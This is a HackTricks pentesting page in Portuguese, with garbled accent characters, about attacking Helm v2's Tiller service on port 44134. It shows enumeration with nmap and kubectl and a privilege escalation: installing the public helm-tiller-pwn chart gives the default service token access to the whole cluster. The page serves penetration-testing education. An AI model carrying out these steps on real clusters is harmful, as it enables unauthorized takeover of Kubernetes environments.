{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# Informa√ß√µes B√°sicas

Helm √© o **gerenciador de pacotes** para Kubernetes. Ele permite empacotar arquivos YAML e distribu√≠-los em reposit√≥rios p√∫blicos e privados. Esses pacotes s√£o chamados de **Helm Charts**. **Tiller** √© o **servi√ßo** **executado** por padr√£o na porta 44134 oferecendo o servi√ßo.

**Porta padr√£o:** 44134
```
PORT      STATE SERVICE VERSION
44134/tcp open  unknown
```
# Enumera√ß√£o

Se voc√™ puder **enumerar pods e/ou servi√ßos** de diferentes namespaces, enumere-os e procure aqueles com **"tiller" no nome**:
```bash
kubectl get pods | grep -i "tiller"
kubectl get services | grep -i "tiller"
kubectl get pods -n kube-system | grep -i "tiller"
kubectl get services -n kube-system | grep -i "tiller"
kubectl get pods -n <namespace> | grep -i "tiller"
kubectl get services -n <namespace> | grep -i "tiller"
```
Exemplos:
```bash
kubectl get pods -n kube-system
NAME                                       READY   STATUS             RESTARTS   AGE
kube-scheduler-controlplane                1/1     Running            0          35m
tiller-deploy-56b574c76d-l265z             1/1     Running            0          35m

kubectl get services -n kube-system
NAME            TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)                  AGE
kube-dns        ClusterIP   10.96.0.10     <none>        53/UDP,53/TCP,9153/TCP   35m
tiller-deploy   ClusterIP   10.98.57.159   <none>        44134/TCP                35m
```
Voc√™ tamb√©m pode tentar encontrar este servi√ßo em execu√ß√£o verificando a porta 44134:
```bash
sudo nmap -sS -p 44134 <IP>
```
Uma vez que voc√™ o tenha descoberto, pode se comunicar com ele baixando o aplicativo cliente helm. Voc√™ pode usar ferramentas como `homebrew`, ou olhar na [**p√°gina oficial de lan√ßamentos**](https://github.com/helm/helm/releases)**.** Para mais detalhes, ou para outras op√ß√µes, consulte [o guia de instala√ß√£o](https://v2.helm.sh/docs/using\_helm/#installing-helm).

Ent√£o, voc√™ pode **enumerar o servi√ßo**:
```
helm --host tiller-deploy.kube-system:44134 version
```
## Escalada de Privil√©gios

Por padr√£o, **Helm2** foi instalado no **namespace kube-system** com **altos privil√©gios**, ent√£o se voc√™ encontrar o servi√ßo e tiver acesso a ele, isso pode permitir que voc√™ **escalone privil√©gios**.

Tudo o que voc√™ precisa fazer √© instalar um pacote como este: [**https://github.com/Ruil1n/helm-tiller-pwn**](https://github.com/Ruil1n/helm-tiller-pwn) que dar√° ao **token de servi√ßo padr√£o acesso a tudo em todo o cluster.**
```
git clone https://github.com/Ruil1n/helm-tiller-pwn
helm --host tiller-deploy.kube-system:44134 install --name pwnchart helm-tiller-pwn
/pwnchart
```
Em [http://rui0.cn/archives/1573](http://rui0.cn/archives/1573) voc√™ tem a **explica√ß√£o do ataque**, mas basicamente, se voc√™ ler os arquivos [**clusterrole.yaml**](https://github.com/Ruil1n/helm-tiller-pwn/blob/main/pwnchart/templates/clusterrole.yaml) e [**clusterrolebinding.yaml**](https://github.com/Ruil1n/helm-tiller-pwn/blob/main/pwnchart/templates/clusterrolebinding.yaml) dentro de _helm-tiller-pwn/pwnchart/templates/_ voc√™ pode ver como **todos os privil√©gios est√£o sendo dados ao token padr√£o**.


{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
